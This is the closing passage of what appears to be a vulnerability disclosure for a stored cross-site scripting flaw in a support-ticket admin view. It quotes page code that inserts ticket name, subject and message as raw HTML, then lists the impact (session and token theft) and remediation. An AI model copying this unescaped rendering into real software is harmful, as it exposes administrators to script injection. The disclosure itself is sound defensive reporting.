            <div class="detail-field">
                <div class="detail-label">IP Address</div>
                <div class="detail-val">${safe(t.ip)}</div>
            </div>
            <div class="detail-field">
                <div class="detail-label">User-Agent</div>
                <div class="detail-val">${safe(t.user_agent)}</div>
            </div>
            <div class="detail-field">
                <div class="detail-label">Name (optional)</div>
                <div class="detail-val" id="dName"></div>
            </div>
            <div class="detail-field">
                <div class="detail-label">Subject</div>
                <div class="detail-val" id="dSubject"></div>
            </div>
            <div class="detail-field">
                <div class="detail-label">Message</div>
                <div class="detail-val" id="dMessage" style="min-height:80px;"></div>
            </div>
            <div class="detail-field">
                <div class="detail-label">Submitted</div>
                <div class="detail-val">${safe(ago(t.created_at))}</div>
            </div>`;

        dangerousInnerHTML(document.getElementById('dName'),    t.name    || '<em style="color:var(--text2)">Anonymous</em>');
        dangerousInnerHTML(document.getElementById('dSubject'), t.subject);
        dangerousInnerHTML(document.getElementById('dMessage'), t.message);

        triggerCallback(t.id);

    }catch(e){body.innerHTML='<div class="empty-state">Failed to load ticket.</div>';}
}
loadTicket();

</script>
<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;534dbc1854e3437aa1164d09110b7f47&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>


</body></html>
```
## Impact
Execution of arbitrary JavaScript code within the high-privilege session of an administrator reviewing stored support tickets.

Compromise of administrative sessions, potential cookie or token exfiltration, and unauthorized modification of support ticket statuses or application data.

Persistent code execution affecting backend triage handlers and support agent review dashboards.

## Remediation
Implement strict context-aware output encoding (such as HTML entity encoding) for all stored user inputs when rendering them in administrative tables, dashboards, or detail views.

Apply strict input validation and sanitization policies on all support ticket submission endpoints (Name, Subject, Message fields) to reject or neutralize HTML markup and script tags.

Deploy a comprehensive Content Security Policy (CSP) restricting inline script execution and unauthorized external script domains.
